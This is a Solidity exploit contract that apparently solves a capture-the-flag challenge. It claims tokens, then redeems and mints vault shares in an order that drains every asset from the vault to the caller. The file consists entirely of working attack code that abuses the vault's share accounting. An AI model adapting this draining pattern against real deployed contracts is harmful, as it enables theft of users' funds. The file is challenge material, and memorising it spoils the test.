// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Setup } from "src/rational/Setup.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 1000 GREY
        setup.claim();
        
        // Redeem 0 shares
        setup.vault().redeem(0);

        // Mint 1 share
        setup.grey().approve(address(setup.vault()), 1);
        setup.vault().mint(1);

        // Redeem 1 share to withdraw all assets from the vault
        setup.vault().redeem(1);

        // Transfer all GREY to msg.sender
        setup.grey().transfer(msg.sender, 6000e18);
    }
}